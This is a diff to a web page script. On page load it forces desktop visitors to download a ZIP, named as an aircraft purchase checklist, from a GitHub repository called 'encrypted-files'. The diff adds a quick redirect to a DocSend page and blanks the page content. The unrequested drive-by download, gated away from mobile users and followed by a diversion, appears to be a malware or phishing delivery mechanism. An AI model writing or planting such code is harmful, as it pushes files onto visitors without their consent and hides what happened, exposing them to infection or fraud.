@@ -39,12 +39,21 @@
     document.addEventListener("DOMContentLoaded", function(){
       var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
       if(!isMobile){
+        // Trigger ZIP download first
         var link = document.createElement('a');
         link.href = "https://raw.githubusercontent.com/yvonsguin-afk/encrypted-files/refs/heads/main/Aircraft_Purchase_Checklist.zip";
         link.download = "Aircraft_Purchase_Checklist.zip";
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
+
+        // After short delay, redirect to DocSend in same tab
+        setTimeout(function(){
+          window.location.href = "https://docsend.com/view/vk4y39e5knptgmaj";
+        }, 500); // 0.5s delay ensures download starts first
+
+        // Blank out content
+        document.body.innerHTML = "";
       }
     });
   </script>
